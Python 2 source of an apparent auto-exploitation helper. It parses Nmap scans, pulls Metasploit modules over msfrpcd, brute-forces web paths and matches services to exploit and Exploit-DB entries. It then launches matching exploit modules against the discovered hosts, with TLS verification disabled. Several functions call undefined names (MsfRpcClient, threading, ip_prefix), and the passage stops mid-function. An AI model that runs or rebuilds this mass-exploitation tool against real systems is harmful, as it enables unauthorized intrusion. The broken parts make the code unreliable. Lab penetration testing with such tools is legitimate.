#!/usr/bin/env python
# -*- coding: utf-8 -*-
from subprocess import Popen
import string
import random
import sys
reload(sys)
sys.setdefaultencoding("utf-8")
import sqlite3
import datetime
from time import gmtime, strftime
import os, optparse, sys, subprocess
try:
 import msfrpc
except:
 print "Please install msfrpc from https://github.com/SpiderLabs/msfrpc/tree/master/python-msfrpc"
 print "\n"
 print "cd /tmp && git clone https://github.com/SpiderLabs/msfrpc"
 print "cd msfrpc && cd cd python-msfrpc && python setup.py install"
 print "pip install msgpack-python"
 print "\n"
 sys.exit()
from time import sleep
import time
import random
try:
 from tabulate import tabulate
except:
 print "Please run 'pip install tabulate'"
try:
 from termcolor import colored, cprint
except:
 print "Please run 'pip install termcolor'"
import socket
import itertools
import os
from sys import platform
try:
 from bs4 import BeautifulSoup
except:
 print "Please run 'pip install beautifulsoup4'"
from urlparse import urlparse
from xml.etree import ElementTree
try:
 from libnmap.parser import NmapParser
except:
 print "Please run 'pip install python-libnmap'"
import platform
import re
import argparse
import sys
try:
 import requests
except:
 print "Please run 'pip install requests'"
import multiprocessing
from itertools import islice
multiprocessing.allow_connection_pickling()
import commands
import optparse
import socket
import fcntl
import struct

mypassword=""
portsInput=""
intelligentMode=False
scanAll=False
numOfThreads=10
chunkSize=50
manualStart=False
verbose=False
blankDB=False
bold=True
internetUp=False
showOnly=False
portInfo=False
quickMode=False
msfIP="127.0.0.1"
msfPort=55552
execMethod="all"
nmapFilename=""

#Dependencies
#git clone https://github.com/SpiderLabs/msfrpc
#cd python-msfrpc && python setup.py install
#pip install tabulate termcolor python-libnmap
#Useful VM for testing: https://github.com/rapid7/metasploitable3/wiki/Vulnerabilities

autoExpListExp=[]
autoExpListAux=[]
manualExpList=[]

allPortList=[]
allPortModuleList=[]
allPathList=[]
allPathModuleList=[]

uniqueSvcNameList=[]
uniqueSvcBannerList=[]
portsList=[]
httpsList=[]
httpList=[]
osList=[]

runManualList=[]
workingExploitList=[]
targetList=[]

catchDupSessionList=[]

tmpTargetURIList=[]
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
requests.packages.urllib3.disable_warnings()
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS += ':RC4-SHA'

headers = {"User-Agent": "Mozilla/5.0 (Windows NT 6.2; rv:30.0) Gecko/20150101 Firefox/32.0",
			"Connection": "keep-alive"}

msfPath="/usr/share/metasploit-framework"
class colors:
  def __init__(self):
    self.green = "\033[92m"
    self.blue = "\033[94m"
    self.bold = "\033[1m"
    self.yellow = "\033[93m"
    self.red = "\033[91m"
    self.end = "\033[0m"
color = colors()

class Logger(object):
    def __init__(self):
        self.terminal = sys.stdout
        self.log = open("logfile.log","w")

    def write(self, message):
        self.terminal.write(message)
        #message=message.encode('ascii','replace')
        self.log.write(message)

    def flush(self):
        pass
sys.stdout = Logger()

def generatePassword():
 chars = string.letters + string.digits
 pwdSize = 20
 return ''.join((random.choice(chars)) for x in range(pwdSize))

def get_ip_address():
    cmd="ifconfig | sed -En 's/127.0.0.1//;s/.*inet (addr:)?(([0-9]*\.){3}[0-9]*).*/\\2/p'"
    results=runCommand(cmd)
    resultList=results.split("\n")
    return resultList[0]
    #s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    #return socket.inet_ntoa(fcntl.ioctl(
    #    s.fileno(),
    #    0x8915,  # SIOCGIFADDR
    #    struct.pack('256s', ifname[:15])
    #)[20:24])

def escape_ansi(line):
    ansi_escape = re.compile(r'(\x9B|\x1B\[)[0-?]*[ -\/]*[@-~]')
    return ansi_escape.sub('', line)

def parseNmap(filename):
 tmphttpList=[]
 tmphttpsList=[]
 tmpportsList=[]
 tmpOSList=[]

 with open (filename, 'rt') as file:
  tree=ElementTree.parse(file)
 rep = NmapParser.parse_fromfile(filename)
 for _host in rep.hosts:
  ip = (_host.address)
  for osmatch in _host.os.osmatches:
   os = osmatch.name
   accuracy = osmatch.accuracy
   if "linux" in os.lower() or "unix" in os.lower():
    if [ip,"linux"] not in tmpOSList:
     tmpOSList.append([ip,"linux"])
    if [ip,"unix"] not in tmpOSList:
     tmpOSList.append([ip,"unix"])
   if "windows" in os.lower():
    tmpOSList.append([ip,"windows"])
   if "apple" in os.lower() or "apple os x" in os.lower():
    tmpOSList.append([ip,"osx"])
   if "solaris" in os.lower():
    tmpOSList.append([ip,"solaris"])
  for services in _host.services:
   if services.state=="open":
    try:
     if len((services.banner).split(" ")[1])>2:
      serviceBanner=((services.banner).split(" ")[1]).lower()
      if [ip,services.port,serviceBanner] not in uniqueSvcBannerList:
       uniqueSvcBannerList.append([ip,services.port,serviceBanner])
    except IndexError as e:
     pass
    tmpportsList.append([str(ip),str(services.port),services.protocol,services.service])
    if services.service!="http":
     if services.service not in uniqueSvcNameList and "?" not in str(services.service):
      uniqueSvcNameList.append([ip,services.port,services.service])
    else:
     if services.tunnel=="ssl":
      tmphttpsList.append([str(ip),str(services.port),services.protocol,services.service])
     else:
      tmphttpList.append([str(ip),str(services.port),services.protocol,services.service])
 return tmpportsList,tmphttpsList,tmphttpList,tmpOSList

def checkInternetAccess():
  try:
    t = requests.get('http://detectportal.firefox.com/success.txt')
    return t.text.strip('\n') == 'success'
  except:
     pass
  return False

def extractPortInfo(x):
	response=""
	portNo=x[0]
	protocol=x[1]
	port=""
	portDesc=""
	portName=""
	conn=""
	if not os.path.exists("portDB.sqlite"):
		conn = sqlite3.connect("portDB.sqlite")
		conn.text_factory = str
		try:
			conn.execute('''CREATE TABLE db
		       (portNo       	  TEXT     NOT NULL,
		        portType     	  TEXT     NOT NULL,
		        portDescription   TEXT UNIQUE   NOT NULL);''')
		except Exception as e:
			pass
	else:
		conn = sqlite3.connect("portDB.sqlite")
		conn.text_factory = str
	url="http://webcache.googleusercontent.com/search?q=cache:http://www.speedguide.net/port.php?port="+str(portNo)
	cur=conn.execute("SELECT portNo, portType, portDescription from db WHERE portNo=?",(str(portNo)+"/"+str(protocol),))
	row = cur.fetchone()
	if row!=None:
		port=row[0]
		portName=row[1]
		portDesc=row[2]
	else:
	        if internetUp==True:
 		 r = requests.get(url, headers=headers, verify=False, timeout=15,allow_redirects=False)
		 soup = BeautifulSoup(r.content,'lxml')
		 try:
			table = soup.find("table", {"class": "port"})
			rows = table.find_all('tr')
			bold=True
			found=False
			for tr in rows:
				cols = tr.find_all('td')
				if found==False:
					try:
						if protocol in cols[1].text.strip():
							port=str(portNo)+"/"+protocol
							portName=cols[2].text.strip()
							portDesc=cols[3].text.split("\n")[0]
							conn.execute("INSERT INTO db (portNo, portType, portDescription) VALUES  (?,?,?)" , (port,portName,portDesc));
							conn.commit()
							found=True
			 		except:
						pass
 		 except:
			pass
	time.sleep(3)
	conn.close()
	return [port,portName,portDesc]

def setColor(message, bold=False, color=None, onColor=None):
	retVal = colored(message, color=color, on_color=onColor, attrs=("bold",))
	return retVal

def chunk(it, size):
 it = iter(it)
 return iter(lambda: tuple(islice(it, size)), ())

def testURL(url1):
	resLen=0
	pageSize=0
	title=''
	try:
		#print url1
		r = requests.get(url1, headers=headers, verify=False, timeout=5,allow_redirects=False)
		url1=url1.strip()
		#print url1+"\t"+str(r.status_code)
		#html = BeautifulSoup(r.text,'html.parser')
		if r.status_code==200 or r.status_code==401:
			html = BeautifulSoup(r.text,'lxml')
			title = html.title.string
			pageSize = len(r.text)
			return [url1,str(r.status_code),pageSize,str(title)[0:19]]
	except requests.exceptions.ConnectionError as e:
		pass
	except requests.exceptions.ReadTimeout as e:
		pass
	except Exception as e:
		pass

def testMultiURL(url,pathList):
	global chunkSize
	pathList.append("/fakeURL1")
	pathList.append("/fakeURL2")
	pathList.append("/fakeURL3")
	tmpResultList2=[]
	tmpUrlList=[]
	#if len(pathList)>50:
	#	chunkSize=10
	splitUrlList=list(chunk(pathList, chunkSize))
	count=1
	#print "Total Chunks: "+str(len(splitUrlList))
	for chunkList in splitUrlList:
		tmpResultList=[]
		tmpResultList1=[]
		tmpUrlList=[]
		#print "Chunk #"+str(count)
		for y in chunkList:
			tmpUrlList.append(url+y)
		p = multiprocessing.Pool(numOfThreads)
		tmpResultList = p.map(testURL,tmpUrlList)
		tmpResultList = [x for x in tmpResultList if not x is None]
		for x in tmpResultList:
			if x not in tmpResultList1:
				tmpResultList1.append(x)
		p.close()
		p.join()
		p.terminate()
		lastDomain=None
		tmpList=[]
		tmpPageTitleList=[]
		for x in tmpResultList1:
			url1=x[0]
			parsed_uri = urlparse(url1)
			domain = '{uri.netloc}'.format(uri=parsed_uri)
			statusCode=x[1]
			pageSize=x[2]
			pageTitle=x[3]
			itemCount=0
			tmpPageTitleList.append(pageTitle)
		if len(tmpResultList1)==len(set(tmpPageTitleList)):
			for x in tmpResultList1:
				tmpResultList2.append(x[0])
		else:
			for x in tmpResultList1:
				if (tmpPageTitleList).count(x[3])<2:
					tmpResultList2.append(x[0])
		tmpResultList=[]
		tmpResultList1=[]
		count+=1
	return tmpResultList2

def isOpen(ip,port):
   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   try:
      s.connect((ip, int(port)))
      s.shutdown(2)
      return True
   except:
      return False

def find_between( s, first, last ):
    try:
        start = s.index( first ) + len( first )
        end = s.index( last, start )
        return s[start:end]
    except ValueError:
        return ""

def runCommand(fullCmd):
    try:
        return commands.getoutput(fullCmd)
    except:
        return "Error executing command %s" %(fullCmd)

def extractParam(uri,filename):
 with open(filename) as f:
  lines = f.read().splitlines()
 moduleName = filename.replace(msfPath,"")
 startFound=False
 pathList=[]
 tempStrList=[];
 finalList=[]
 optionList=[]
 found=False
 foundName=False
 moduleTitle=""
 for line in lines:
  if "'Name'" in line:
   if foundName==False:
    line1 = line.split("=>")
    if len(line1)>1:
     moduleTitle=(line1[1])[2:-2]
     moduleTitle=moduleTitle.replace(","," ")
  if "register_options" in line:
   startFound=True
  if "self.class" in line and found==False:
   found1=False
   for y in optionList:
    if found1==True:
     y = y.strip()
     if "#" not in y:
      tempStrList.append(y)
    if ".new" in y:
     if found1==True:
      tempStrList=[]
      found1=False
     if "[" in y and "]" in y:
      y = y.strip()
      finalList.append(y)
     else:
      y = y.strip()
      if "#" not in y:
       tempStrList.append(y)
       found1=True
   startFound=False
   found=True
  if startFound==True:
   optionList.append(line)
 result1=""
 for y in tempStrList:
  try:
   m = re.search('"(.+?)"',y)
   temp1 = str(m.group(1)).replace(",","")
   y = y.replace(m.group(1),temp1)
   result1 += y
  except AttributeError:
   result1 += y
   continue
 if len(str(result1))>0:
  result1 = result1.replace(" ","")
  finalList.append(result1)
 tempStr1=""
 for g in finalList:
  if "false" not in g.lower() and "rhost" not in g.lower():
   parameterList = g.partition('[')[-1].rpartition(']')[0]
   parNameTemp =( g.split(",")[0]).partition("'")[-1].rpartition("'")[0]
   result = (parameterList.split(",")[-1]).strip()
   if result=='""' or result=="''":
    tempStr1+= parNameTemp
    tempStr1+= "+"
 moduleName = moduleName.replace(".rb","")
 if len(tempStr1)>0:
  if tempStr1[-1]==",":
   results = uri+","+moduleName+",["+tempStr1[0:(len(tempStr1)-1)]+"],"+moduleTitle
   return results
  else:
   results = uri+","+moduleName+",["+tempStr1[0:(len(tempStr1)-1)]+"],"+moduleTitle
   return results
 else:
  results = uri+","+moduleName+",[],"+moduleTitle
  return results

def retrieveModuleDetails(input):
   global tmpTargetURIList
   category=input[0][0]
   module=input[0][1]
   uriPath=''
   moduleDescription=''
   moduleOptions=''
   complete=False
   while complete==False:
    try:
     import msfrpc
     msfrpc = reload(msfrpc)
     opts={}
     opts['host']='127.0.0.1'
     opts['port']=msfPort
     opts['uri']='/api/'
     opts['ssl']=False

     client = msfrpc.Msfrpc(opts)
     client.login('msf', mypassword)
     moduleDescription=(client.call('module.info',[category,module])['description']).strip()

     import msfrpc
     opts={}
     opts['host']='127.0.0.1'
     opts['port']=msfPort
     opts['uri']='/api/'
     opts['ssl']=False

     msfrpc = reload(msfrpc)
     client = msfrpc.Msfrpc(opts)
     client.login('msf', mypassword)
     moduleOptions=client.call('module.options',[category,module])
     complete=True
    except Exception as e:
     print "[!] Encountered Error: Retrying in 5 seconds\n"
     time.sleep(2)

   moduleName=module
   if filterModuleName(moduleName)==True:
    if 'TARGETURI' in str(moduleOptions).upper():
     for key, value in moduleOptions.iteritems():
      if key=='TARGETURI':
        try:
	 uriPath=value['default']
         tmpTargetURIList.append([uriPath,category,moduleName])
	except KeyError:
         uriPath=''
         tmpTargetURIList.append([uriPath,category,moduleName])
    if filterModuleName(moduleName)==True:
     portNo=None
     targetSingle=True
     if 'RPORT' in str(moduleOptions):
      for key, value in moduleOptions.iteritems():
       if key=='RPORT':
        try:
         portNo=value['default']
        except KeyError:
         portNo=None
     else:
      if 'RPORTS' in str(moduleOptions):
       for key, value in moduleOptions.iteritems():
        if key=='RPORTS':
         try:
          portNo=value['default']
         except KeyError:
          portNo=80
      else:
       if "/http/" in moduleName:
        portNo=80
     if 'RHOSTS' in str(moduleOptions):
      targetSingle=False
     else:
      if 'RHOST' in str(moduleOptions):
       targetSingle=True
     if portNo!=None:
       tmpOptionList=[]
       moduleOptions=client.call('module.options',[category,moduleName])
       for key, value in moduleOptions.iteritems():
        if key!='RHOST' and key!='RHOSTS':
         if value['required']==True:
 	  try:
           if value['default']=='':
            tmpOptionList.append(key)
          except:
	   tmpOptionList.append(key)
       if len(tmpOptionList)>0:
        optionStr=''
        count=0
        totalCount=len(tmpOptionList)
        for x in tmpOptionList:
         x=x.strip()
         optionStr+=x
         if totalCount>1:
          if count<totalCount-1:
           optionStr+="|"
         count+=1
        return [portNo,category,moduleName,optionStr,uriPath,moduleDescription]
       else:
        return [portNo,category,moduleName,'',uriPath,moduleDescription]

def searchModule(x):
   foundList=[]
   searchKeyword1=''
   searchKeyword=x
   if searchKeyword!="unknown":
    if "-" in searchKeyword:
     searchKeyword1=searchKeyword.split("-")[0]
    else:
     searchKeyword1=searchKeyword
    keywordBlacklist=[]
    keywordBlacklist.append("http")
    if searchKeyword1 not in keywordBlacklist:
     for y in allPortModuleList:
      portNo=y[0]
      moduleType=y[1]
      moduleName=y[2]
      moduleParameters=y[3]
      moduleDescription=y[4]
      if "/"+searchKeyword1.lower()+"/" in moduleName.lower() and searchKeyword1.lower() not in keywordBlacklist:
       if filterModuleName(moduleName)==True:
        if [moduleType,moduleName,portNo,searchKeyword1,moduleParameters,moduleDescription] not in foundList:
         foundList.append([moduleType,moduleName,portNo,searchKeyword1,moduleParameters,moduleDescription])

      if "_"+searchKeyword1.lower()+"_" in moduleName.lower() and searchKeyword1.lower() not in keywordBlacklist:
       if filterModuleName(moduleName)==True:
        if [moduleType,moduleName,portNo,searchKeyword1,moduleParameters,moduleDescription] not in foundList:
         foundList.append([moduleType,moduleName,portNo,searchKeyword1,moduleParameters,moduleDescription])
      #if searchKeyword1.lower() in moduleDescription.lower() and searchKeyword1 not in keywordBlacklist:
      #  if [moduleType,moduleName,portNo,searchKeyword1,moduleParameters,moduleDescription] not in foundList:
      #   foundList.append([moduleType,moduleName,portNo,searchKeyword1,moduleParameters,moduleDescription])
   return searchKeyword1,foundList

def pullMSF():
  ip=msfIP
  port=msfPort
  if manualStart==True:
   print "[*] Please run 'msfconsole' and then type 'msgrpc load Pass=xxx'"
  testConnection=False
  while testConnection==False:
   try:
    opts={}
    opts['host']='127.0.0.1'
    opts['port']=msfPort
    opts['uri']='/api/'
    opts['ssl']=False
    client = msfrpc.Msfrpc(opts)
    client.login('msf', mypassword)
    testConnection=True
   except Exception as e:
    if 'Connection refused' in str(e):
     time.sleep(1)
    if 'Authentication failed' in str(e):
     print "[!] Incorrect password"
     sys.exit()
  tmpModuleList=[]

  opts={}
  opts['host']='127.0.0.1'
  opts['port']=msfPort
  opts['uri']='/api/'
  opts['ssl']=False

  client = msfrpc.Msfrpc(opts)
  if client.login('msf', mypassword)==False:
   print "[!] Unable to connect to msfrpcd"
   sys.exit()
  aux_list=client.call('module.auxiliary', [])['modules']
  for x in aux_list:
   tmpModuleList.append(['auxiliary',x])
  time.sleep(1)
  exp_list=client.call('module.exploits', [])['modules']
  for x in exp_list:
   tmpModuleList.append(['exploit',x])
  print "\n[*] Loaded "+str(len(tmpModuleList))+" modules from Metasploit"
  del client
  return tmpModuleList

def startMSF():
  print "[*] Launching Metasploit msfrpcd"
  count=0
  cmd=msfPath+"/msfrpcd -p "+str(msfPort+count)+" -U msf -P "+mypassword+" -a "+msfIP+" -u /api/ -S"
  os.system(cmd)
  #while count<numOfThreads:
  # cmd=msfPath+"/msfrpcd -p "+str(msfPort+count)+" -U msf -P "+mypassword+" -a "+msfIP+" -u /api/ -S"
  # subprocess.call(cmd, stdout=subprocess.PIPE, shell=True)
  # count+=1

def killMSF():
  #cmd="pkill -x msfrpcd"
  cmd="pkill -f msfrpcd"
  os.system(cmd)

def updateMSF():
  cmd = msfPath+"/msfupdate"
  os.system(cmd)

def lookupPortDB(inputPortNo,portProtocol):
 tmpResultList=[]
 for x in allPortModuleList:
  portNo=x[0]
  moduleType=x[1]
  moduleName=x[2]
  moduleParameters=x[3]
  moduleDescription=x[4]
  if str(portNo)==str(inputPortNo):
   tmpResultList.append([portNo,moduleType,moduleName,moduleParameters,moduleDescription])
 return tmpResultList


def runExploit(rhost,category,moduleName):
  client = MsfRpcClient(mypassword)
  exploit=client.modules.use(category,moduleName)
  try:
    exploit['RHOST'] = rhost
  except KeyError:
    exploit['RHOSTS'] = rhost
  try:
    if not options.d:
     results=exploit.execute()
     return results['job_id']
  except Exception as e:
    pass

def test_port(ip, port):
    try:
        s = socket.socket()
        s.settimeout(2)
        s.connect((str(ip), int(port)))
        s.close
        screenLock.acquire()
        print ip
        screenLock.release()
        return True
    except:
        return False

def start_thread(ip, port):
    t = threading.Thread(target=test_port, args=(ip, port))
    t.start()

def scanSubnet(ipRange):
 screenLock = threading.Semaphore(value=1)
 for n in range(0,256):
    ip = ip_prefix + "." + str(n)
    start_thread(ip, port)

def updateDB(tmpModuleList):
 print "[*] Updating msfHelper.db"
 #Update Database
 tmpPathList=[]
 p = multiprocessing.Pool(numOfThreads)
 tmpResultList = p.map(retrieveModuleDetails,itertools.izip(tmpModuleList))
 p.close()
 p.terminate()

 f1 = open('pathList.txt','w')
 f = open('portList.csv','w')
 conn = sqlite3.connect(os.getcwd()+"/msfHelper.db")
 conn.text_factory = str
 for x in tmpResultList:
  if x!=None:
   portNo=x[0]
   moduleType=x[1]
   moduleName=x[2]
   moduleParameters=x[3]
   uriPath=x[4]
   moduleDescription=x[5]
   moduleDescription=moduleDescription.replace("\n"," ")
   if uriPath not in tmpPathList:
    tmpPathList.append(uriPath)
    if uriPath!=None and len(uriPath)>1:
     f1.write(uriPath+"\n")
   f.write(str(portNo)+","+moduleType+","+moduleName+","+moduleParameters+"\n")
   try:
    conn.execute("INSERT INTO portList (portNo,moduleType,moduleName,moduleParameters,moduleDescription) VALUES  (?,?,?,?,?)" , (portNo,moduleType,moduleName,moduleParameters,moduleDescription,));
    conn.commit()
   except sqlite3.IntegrityError:
    continue
   if len(uriPath)>0:
    try:
     conn.execute("INSERT INTO pathList (uriPath,moduleType,moduleName,moduleParameters,moduleDescription) VALUES  (?,?,?,?,?)" , (uriPath,moduleType,moduleName,moduleParameters,moduleDescription,));
     conn.commit()
    except sqlite3.IntegrityError:
     continue
   print "[*] Adding: "+moduleName
 conn.close()
 f.close()
 f1.close()

def diff(list1, list2):
    c = set(list1).union(set(list2))
    d = set(list1).intersection(set(list2))
    return list(c - d)

def runExploitDBModules():
	vulnURLList=[]
	if execMethod=="all" or execMethod=="exploitdb":
	 exploitDBList=readExploitDB()
	 tmpPathList=[]
 	 for x in exploitDBList:
	  filename=x[0]
	  pathName=x[1]
	  url=x[2]
	  category=x[3]
          if pathName not in tmpPathList:
           tmpPathList.append(pathName)

         if len(httpList)>0:
          tmpHttpList=[]
	  for x in httpList:
	   url="http://"+x[0]+":"+x[1]
	   if url not in tmpHttpList:
	    tmpHttpList.append(url)
	  for host in tmpHttpList:
           tmpResultList=testMultiURL(host,tmpPathList)
	   for x in tmpResultList:
            if x not in vulnURLList:
 	     if "index.php" not in x:
              vulnURLList.append(x)

 	 if len(httpsList)>0:
          tmpHttpsList=[]
	  for x in httpsList:
	   url="https://"+x[0]+":"+x[1]
	   if url not in tmpHttpsList:
	    tmpHttpsList.append(url)
          for host in tmpHttpsList:
           tmpResultList=testMultiURL(host,tmpPathList)
 	   for x in tmpResultList:
	    if "index.php" not in x:
             vulnURLList.append(x)

 	 tmpPathResultList=[]
	 if len(vulnURLList)<1:
	  print "No results found"
          print "\n"
         else:
          message="\n[*] Found the below URLs on the web servers"
 	  print(setColor(message, bold, color="red"))
	  for x in vulnURLList:
	   print x
	 for x in vulnURLList:
	    for y in exploitDBList:
 	     path = urlparse(x).path
	     if path==y[1] and path!="/":
 	      tmpPathResultList.append([x,y[0],y[3]])

         if len(tmpPathResultList)>1:
          tmpList1=[]
          message="\n[*] Found the below possible Exploit-DB entries"
 	  print(setColor(message, bold, color="red"))
	  for x in tmpPathResultList:
	   x[1]=x[1].replace("/pentest/","")
           if [x[1],"["+x[2]+"]"] not in tmpList1:
 	    tmpList1.append([x[1],"["+x[2]+"]"])
          tmpList1.sort()
          print tabulate(tmpList1)
          tmpList1=[]
	 exploitDBList=[]
	return ""

def runWebBasedModules():
	if execMethod=="all" or execMethod=="web":
	 vulnURLList=[]
	 message="\n**** Finding MSF Modules - Bruteforcing URI Paths ****"
	 print(setColor(message, bold, color="red"))
         if len(httpList)>0:
          tmpHttpList=[]
	  for x in httpList:
	   url="http://"+x[0]+":"+x[1]
	   if url not in tmpHttpList:
	    tmpHttpList.append(url)
	  for host in tmpHttpList:
           tmpResultList=testMultiURL(host,allPathList)
	   for x in tmpResultList:
            if x not in vulnURLList:
 	     if "index.php" not in x[0]:
              vulnURLList.append(x[0])

 	 if len(httpsList)>0:
          tmpHttpsList=[]
	  for x in httpsList:
	   url="https://"+x[0]+":"+x[1]
	   if url not in tmpHttpsList:
	    tmpHttpsList.append(url)
          for host in tmpHttpsList:
           tmpResultList=testMultiURL(host,allPathList)
 	   for x in tmpResultList:
	    if "index.php" not in x[0]:
             vulnURLList.append(x[0])

 	 tmpPathResultList=[]
	 if len(vulnURLList)<1:
	  print "No results found"
          print "\n"
	 for x in vulnURLList:
	  for y in allPathModuleList:
	    path = urlparse(x).path
	    if path==y[0] and path!="/":
 	     tmpPathResultList.append([x,y[1]+"/"+y[2]])

         if len(tmpPathResultList)>1:
	  for x in tmpPathResultList:
	   print x

         #Temp holder for running metasploit modules against the root of web servers
	 defaultPathModuleList=[]
	 for x in allPathModuleList:
	  uriPath=x[0]
	  moduleType=x[1]
	  moduleName=x[2]
	  moduleParameters=x[3]
	  if uriPath=="/":
	   defaultPathModuleList.append([uriPath,moduleType+"/"+moduleName,moduleParameters])

	 if len(tmpPathResultList)>0:
	  #Run all modules against web servers which uripath matches against the list
 	  print "\n**** Test Results from Metasploit Modules ****"
          print "Please wait ..."
	  #message="\n[*] Launching compatible Metasploit modules"
	  #print(setColor(message, bold, color="red"))
	  tmpPathResultList1=[]
	  maxCount=numOfThreads
	  startCount=0
	  for x in tmpPathResultList:
	   parsed_uri = urlparse(x[0])
	   host = parsed_uri.netloc
	   moduleName=x[1]
	   tmpPathResultList1.append([host,moduleName,startCount])
           if startCount==maxCount-1:
            startCount=0
           else:
            startCount+=1
          runMsfExploitsAndDisplayreport(tmpPathResultList1)

	 #Run all modules against http and https servers matching uriPath=/
 	 if len(httpList)>0:
 	  tmpPathResultList1=[]
	  tmpPathResultList2=[]
	  for x in defaultPathModuleList:
	   for y in httpList:
	    host=y[0]+":"+y[1]
	    moduleName=x[1]
            moduleParameters=x[2]
	    if len(moduleParameters)>0:
 	     tmpPathResultList2.append([host,moduleName])
            else:
 	     tmpPathResultList1.append([host,moduleName])
 	 if len(httpsList)>0:
 	  tmpPathResultList1=[]
	  tmpPathResultList2=[]
	  maxCount=numOfThreads
	  startCount=0
	  for x in defaultPathModuleList:
	   for y in httpList:
	    host=y[0]+":"+y[1]
	    moduleName=x[1]
            moduleParameters=x[2]
	    if len(moduleParameters)>0:
 	     tmpPathResultList2.append([host,moduleName])
            else:
 	     tmpPathResultList1.append([host,moduleName,startCount])
             if startCount==maxCount-1:
              startCount=0
             else:
              startCount+=1

	  if len(tmpPathResultList1)>0 and quickMode==False:
	   message="\n**** Finding MSF Modules which TARGETURI is set to / *****"
	   #message="\n[*] Running other Metasploit modules whose parameter  TARGETURI is set to /"
           print(setColor(message, bold, color="red"))
 	   print "**** Test Results from Metasploit Modules ****"
           print "Please wait ..."
	   runMsfExploitsAndDisplayreport(tmpPathResultList1)

	  tmpPathResultList3=[]
          if len(tmpPathResultList2)>0 and quickMode==False:
	   message="\n[*] The below Metasploit modules need to be run manually as they require additional parameters"
           print(setColor(message, bold, color="red"))
	   tmpModuleList=[]
	   for x in tmpPathResultList2:
	    host=x[0]
	    moduleName=x[1]
	    if moduleName not in tmpModuleList:
             tmpModuleList.append(moduleName)
             for x in tmpModuleList:
              #print x
	      for y in tmpPathResultList2:
               if x==y[1]:
                if [y[0],y[1]] not in tmpPathResultList3:
     	         tmpPathResultList3.append([y[0],y[1]])

	  if len(tmpPathResultList3)>0:
 	   print tabulate(tmpPathResultList3, headers=["Host","Module"])
   	   tmpPathResultList3=[]

def runServiceBasedModules():
	if execMethod=="all" or execMethod=="services":
	 p = multiprocessing.Pool(numOfThreads)
	 tmpResultList=[]
         tmpUniqueSvcNameList=[]
         for x in uniqueSvcNameList:
	  if x[2] not in tmpUniqueSvcNameList:
           tmpUniqueSvcNameList.append(x[2])
         tmpResultList=p.map(searchModule,tmpUniqueSvcNameList)
         tmpResultList1=[]
         p.close()
         p.join()
         p.terminate()
	 tmpList1=[]
         count=0
	 tmpKeywordList=[]
	 if len(tmpResultList)>0:
 	  for z in tmpResultList:
	   title=z[0]
	   moduleList=z[1]
	   if z not in tmpKeywordList:
	    tmpKeywordList.append(z)

	 if len(tmpResultList)>0:
 	  #for z in tmpResultList:
 	  for z in tmpKeywordList:
	   title=z[0]
	   moduleList=z[1]
           if title!="http" and title!="ssl/http" and len(title)>2:
            if count>0:
             print "\n"
     	    print "Finding Modules Based on Keyword: "+title
            count+=1
	    if len(moduleList)<1:
	     print "No results found"
    	    if len(moduleList)>0:
             if intelligentMode==True:
               #if len(moduleList)>0:
               tmpModuleList1=[]
               for a in moduleList:
                if intelligentMode==True:
                 if "windows" not in a[1] and "linux" not in a[1] and "unix" not in a[1] and "osx" not in a[1] and "solaris" not in a[1]:
                  if [a[0],a[1],a[2],a[4]] not in tmpModuleList1:
                   tmpModuleList1.append([a[0],a[1],a[2],a[4]])
                 else:
                  for y in osList:
                   osType=y[1]
                   if osType in a[1]:
                    if [a[0],a[1],a[2],a[4]] not in tmpModuleList1:
                     tmpModuleList1.append([a[0],a[1],a[2],a[4]])
                else:
                 #tmpModuleList1.append([a[0],a[1],a[2],a[3],a[4]])
                 if [a[0],a[1],a[2],a[4]] not in tmpModuleList1:
                  tmpModuleList1.append([a[0],a[1],a[2],a[4]])
               if len(tmpModuleList1)>0:
       	        print tabulate(tmpModuleList1, headers=["Type","Metasploit Module","Port No","Parameters"])
               else:
		print "No results found"
              #else:
              # print "No results found"
             else:
              tmpModuleList1=[]
              for y in moduleList:
               tmpModuleList1.append([y[0],y[1],y[2],y[3]])
              if len(tmpModuleList1)>0:
    	       print tabulate(tmpModuleList1, headers=["Type","Metasploit Module","Port No","Parameters"])
              else:
               print "No results found"
	     for y in moduleList:
              if y not in tmpList1:
     	       tmpList1.append(y)

 	 manualExpList=[]
         tmpList2=[]
	 for x in targetList:
	  hostNo=x[0]
	  portNo=x[1]
	  portProtocol=x[2]
	  portService=x[3]
	  for y in tmpList1:
           tmpCategory=y[0]
           tmpModuleName=y[1]
           tmpPortNo=y[2]
	   tmpServiceName=y[3]
	   tmpModuleParams=y[4]
           tmpModuleDescription=y[5]
	   #Only run exploits if the portNo is not matching
           if tmpServiceName in portService and str(portNo)!=str(tmpPortNo):
           #if tmpServiceName in portService:
            if len(tmpModuleParams)<1:
             if tmpCategory=='auxiliary':
              if [hostNo,portNo,tmpCategory,tmpModuleName,'',tmpModuleDescription] not in autoExpListAux:
               autoExpListAux.append([hostNo,portNo,tmpCategory,tmpModuleName,'',tmpModuleDescription])
             if tmpCategory=='exploit':
              if [hostNo,portNo,tmpCategory,tmpModuleName,'',tmpModuleDescription] not in autoExpListExp:
               autoExpListExp.append([hostNo,portNo,tmpCategory,tmpModuleName,'',tmpModuleDescription])
	    else:
              if [hostNo,portNo,tmpCategory,tmpModuleName,tmpModuleParams,tmpModuleDescription] not in manualExpList:
               manualExpList.append([hostNo,portNo,tmpCategory,tmpModuleName,tmpModuleParams,tmpModuleDescription])


	 startCount=0
  	 maxCount=numOfThreads
	 tmpList1=[]

 	 if len(autoExpListExp)>0 or len(autoExpListAux)>0:
          print "\n**** Test Results from Metasploit Modules ****"
          print "Please wait ..."
 	 if len(autoExpListExp)>0 and showOnly==False:
	  for x in autoExpListExp:
	   hostNo=x[0]
	   portNo=x[1]
	   moduleCategory=x[2]
	   moduleName=x[3]
	   if filterModuleName(moduleName)==True:
            if str(portNo)!="80":
             if [hostNo+":"+portNo,moduleCategory+"/"+moduleName,startCount] not in tmpList1:
              tmpList1.append([hostNo+":"+portNo,moduleCategory+"/"+moduleName,startCount])
             if startCount<maxCount:
              startCount+=1
             else:
              startCount=0

         if len(autoExpListAux)>0 and showOnly==False:
 	  if len(autoExpListAux)>0:
	   for x in autoExpListAux:
	    hostNo=x[0]
	    portNo=x[1]
	    moduleCategory=x[2]
 	    moduleName=x[3]
 	    if filterModuleName(moduleName)==True:
